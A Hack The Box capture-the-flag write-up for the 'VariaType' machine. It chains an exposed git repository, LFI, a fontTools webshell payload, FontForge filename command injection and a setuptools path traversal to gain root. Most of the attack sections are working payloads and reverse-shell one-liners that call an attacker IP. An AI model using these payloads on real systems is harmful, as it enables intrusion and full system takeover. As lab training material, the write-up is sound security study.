# Machine: VariaType

Date: 05-06-2026
Platform: Hack The Box
Difficulty: Medium
Author: atrix187

---

## Vulnerabilities Exploited

- **CVE-2025-66034** — fontTools varLib Arbitrary File Write + XML/CDATA Injection → RCE as `www-data`
- **CVE-2024-25082** — FontForge Archive Extraction Command Injection → Lateral movement to `steve`
- **CVE-2025-47273** — setuptools `PackageIndex` Path Traversal → Root

---

## Recon

### Nmap

```bash
# Phase 1 — fast all-ports
nmap -p- --min-rate 5000 -T4 10.129.14.193 -oN recon/nmap/allports.txt

# Phase 2 — detailed scan on found ports
nmap -sC -sV -p 22,80 10.129.14.193 -oN recon/nmap/detailed.txt
```

```
Starting Nmap 7.99 at 2026-06-05 07:43 -0400
Nmap scan report for 10.129.14.193
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Results:**

- Port 22 → OpenSSH 9.2p1 (Debian)
- Port 80 → nginx 1.22.1

**Notes:**

- Added to `/etc/hosts`:

```bash
echo "10.129.14.193 variatype.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

### Web Fingerprinting

```bash
whatweb http://variatype.htb
whatweb http://portal.variatype.htb
```

Main site findings: nginx/1.22.1, PHP backend (PHPSESSID), title "VariaType Labs — Variable Font Generator"

Portal findings: title "VariaType — Internal Validation Portal", email `it-support@variatype.htb` (potential username), login form

### Subdomain Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://FUZZ.variatype.htb \
  -H "Host: FUZZ.variatype.htb" \
  -ac \
  -o recon/dns/subdomains.txt
```

**Found:** `portal.variatype.htb`

```bash
echo "10.129.14.193 portal.variatype.htb" | sudo tee -a /etc/hosts
```

### Application Analysis

**`http://variatype.htb/tools/variable-font-generator`** — file upload page accepting:
- `.designspace` files (XML-based font configuration)
- `.ttf` or `.otf` master font files

Backend processes uploads with the `fonttools` Python library.

**`http://portal.variatype.htb`** — PHP-based internal validation portal with a login form. Credentials unknown at this stage.

### Exposed Git Repository

```bash
curl http://portal.variatype.htb/.git/HEAD
# ref: refs/heads/master
```

The `.git` directory is exposed (403 on directory listing, but files accessible). Dumped it:

```bash
git-dumper http://portal.variatype.htb/.git/ recon/web/git-dump/
cd recon/web/git-dump
git log --oneline
```

```
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

```bash
git show 753b5f5
```

```diff
diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

Hardcoded credentials recovered from git history. The subsequent commit removed them, but git history is permanent.

### Portal Authentication & Further Enumeration

```bash
curl -s -X POST http://portal.variatype.htb/ \
  -d "username=gitbot" -d "password=G1tB0t_Acc3ss_2025!" \
  -c cookies.txt -L
```

```bash
gobuster dir -u http://portal.variatype.htb \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php -b 302 \
  -c "PHPSESSID=<your_cookie>" \
  --exclude-length 153
```

**Found:** `/dashboard.php`, `/download.php`, `/view.php`, `/files/`, `/.git/`, `/auth.php`

### Path Traversal in `download.php`

```bash
curl -s -b "PHPSESSID=<cookie>" \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/passwd"
```

Returns `/etc/passwd` — directory traversal confirmed. Filter bypass uses `....//` instead of `../`.

**Key user found:** `steve:x:1000:1000:steve,,,:/home/steve:/bin/bash`

### LFI — Reading Internal Configs

```bash
# Nginx config
curl -s -b "PHPSESSID=<cookie>" \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/nginx/nginx.conf"

# Portal vhost
curl -s -b "PHPSESSID=<cookie>" \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/nginx/sites-enabled/portal.variatype.htb"
# Portal webroot: /var/www/portal.variatype.htb/public

# Systemd service file
curl -s -b "PHPSESSID=<cookie>" \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/systemd/system/variatype.service"
# WorkingDirectory=/opt/variatype
# ReadWritePaths=/var/www/portal.variatype.htb/public/files

# Flask app source
curl -s -b "PHPSESSID=<cookie>" \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//opt/variatype/app.py"
# fonttools runs from /tmp/variabype_uploads/<tempdir>/
```

The working directory for fonttools processing is `/tmp/variabype_uploads/<tempdir>/`. This is critical for path traversal depth calculation.

---

## Exploitation

### CVE-2025-66034 — fontTools varLib Arbitrary File Write + CDATA Injection → RCE as `www-data`

fontTools varLib has two chained vulnerabilities:
1. **Arbitrary File Write** — the `filename` attribute in `<variable-font>` is unsanitized, allowing path traversal to write output files anywhere on the filesystem.
2. **XML/CDATA Injection** — content inside `<labelname>` CDATA sections gets embedded into the output font file verbatim, allowing injection of arbitrary content (e.g. PHP code).

Combined: write a PHP webshell to a web-accessible path.

**Path calculation:**

From `/tmp/variabype_uploads/tempdir/` to `/var/www/portal.variatype.htb/public/files/` = 9 levels up:

```
../../../../../../../../../
```

**Steps:**

**1. Create the malicious `.designspace` payload:**

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
  <sources>
    <source filename="source-regular.ttf" name="Regular">
      <location>
        <dimension name="Weight" xvalue="400"/>
      </location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont"
      filename="../../../../../../../../../var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

> The CDATA split technique (`]]]]><![CDATA[>`) closes the first CDATA block and opens a new one, resulting in `?>]]>` in the final output — valid PHP closing tag, bypassing XML parser restrictions.

**2. Upload the payload:**

```bash
curl -s -X POST "http://variatype.htb/tools/variable-font-generator/process" \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-regular.ttf"
# Response: Processing completed.
```

**3. Verify RCE:**

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**4. Set up listener and trigger reverse shell:**

```bash
nc -lvnp 4444

curl -G "http://portal.variatype.htb/files/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.123/4444 0>&1'"
```

```
connect to [10.10.15.123] from (UNKNOWN) [10.129.15.209] 43014
www-data@variatype:~/portal.variatype.htb/public/files$
```

**5. Stabilize shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Result:** Shell as `www-data`.

---

## Lateral Movement

### CVE-2024-25082 — FontForge Archive Extraction Command Injection → `steve`

**Enumeration:**

```bash
find / -name fontforge 2>/dev/null
# /usr/local/src/fontforge/build/bin/fontforge
```

A readable backup script at `/opt/process_client_submissions.bak` revealed a background loop running as `steve` that:
- Watched `/var/www/portal.variatype.htb/public/files/` for new files
- Applied a strict alphanumeric regex to filenames: `^[a-zA-Z0-9._-]+$`
- Accepted archive formats: `*.tar`, `*.zip`, `*.tar.gz`
- Processed them with the local FontForge build

```bash
# Key variables from the script:
UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"
# ...
timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "... fontforge.open('$file') ..."
```

CVE-2024-25082 — when FontForge's `fontforge.open()` processes a compressed archive, it extracts internally via an unsanitized subshell. The outer archive name must pass the regex, but filenames nested inside are extracted raw — command injection via malicious filenames inside the tar.

**Steps:**

**1. Base64-encode the reverse shell to avoid special characters:**

```bash
echo 'bash -i >& /dev/tcp/10.10.15.123/4445 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjMvNDQ0NSAwPiYxCg==
```

**2. Create the malicious filename and pack into a regex-compliant archive:**

```bash
cd /tmp
touch ';echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjMvNDQ0NSAwPiYxCg==|base64 -d|bash;'
tar -cf exploit.tar \;*
cp exploit.tar /var/www/portal.variatype.htb/public/files/
```

**3. Start listener:**

```bash
nc -lvnp 4445
```

Steve's pipeline processed the archive. FontForge extracted the malicious filename, the subshell fired.

```
steve@variatype:/tmp/ffarchive-86705-1$ id
uid=1000(steve) gid=1000(steve) groups=1000(steve)
```

**Result:** Shell as `steve`. User flag at `/home/steve/user.txt`.

---

## Privilege Escalation

### CVE-2025-47273 — setuptools `PackageIndex` Path Traversal → Root

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

`/opt/font-tools/install_validator.py` uses `setuptools.PackageIndex` to download a plugin from a URL argument and save it to `/opt/font-tools/validators/` using:

```python
filename = os.path.join(tmpdir, name)
```

CVE-2025-47273 — `os.path.join` discards the first argument if the second begins with `/`. By URL-encoding a forward slash as `%2f`, the parsed filename becomes an absolute path, bypassing the sandbox directory and writing to arbitrary filesystem locations.

**Steps:**

**1. Create a custom HTTP server on Kali serving a cron payload:**

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer

class ExploitHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()
        cron_payload = b"* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.15.123/4446 0>&1'\n"
        self.wfile.write(cron_payload)

HTTPServer(('0.0.0.0', 80), ExploitHandler).serve_forever()
```

**2. Set up terminals:**

```bash
# Terminal 1 — Kali
sudo python3 server.py

# Terminal 2 — Kali
nc -lvnp 4446
```

**3. Trigger from steve's shell:**

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.15.123/%2fetc%2fcron.d%2froot_shell"
```

`%2f` causes setuptools to write the payload directly to `/etc/cron.d/root_shell`. Within 60 seconds:

```
root@variatype:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Loot / Flags

- **user.txt:** `[REDACTED]` → `/home/steve/user.txt`
- **root.txt:** `[REDACTED]` → `/root/root.txt`

---

## Full Vulnerability Chain

| # | CVE | Location | Impact |
|---|-----|----------|--------|
| 1 | — | `portal.variatype.htb/.git` exposed | Source code & credential disclosure |
| 2 | — | Hardcoded creds in git history | Portal login bypass |
| 3 | — | `download.php` path traversal (`....//`) | Arbitrary file read |
| 4 | CVE-2025-66034 | fonttools `.designspace` processing | RCE as `www-data` |
| 5 | CVE-2024-25082 | FontForge archive extraction | Lateral movement to `steve` |
| 6 | CVE-2025-47273 | setuptools `os.path.join` traversal | Root |

---

## Lessons Learned

- Always probe for exposed `.git` directories. Even a 403 on the directory listing doesn't mean the files inside are protected — `git-dumper` pulls them individually. Git history never forgets deleted content, including hardcoded credentials.
- XML-based file formats (`.designspace`, DOCX, SVG, etc.) are high-value targets for XXE and injection. If a backend parses XML you control, research the specific library version.
- The CDATA split trick (`]]]]><![CDATA[>`) is the standard bypass for injecting `]]>` sequences inside CDATA blocks without breaking XML parsing — worth memorizing.
- `os.path.join` silently discards earlier components when a later argument starts with `/`. Any code that builds file paths this way from URL-parsed input is vulnerable — URL-encode the slash to bypass input validation that only checks for literal `/`.
- Pipeline scripts watching directories are a common privesc path on HTB. Read every `.bak` and script in `/opt/` — they often reveal automated processes running as privileged users and the exact behavior needed to trigger them.
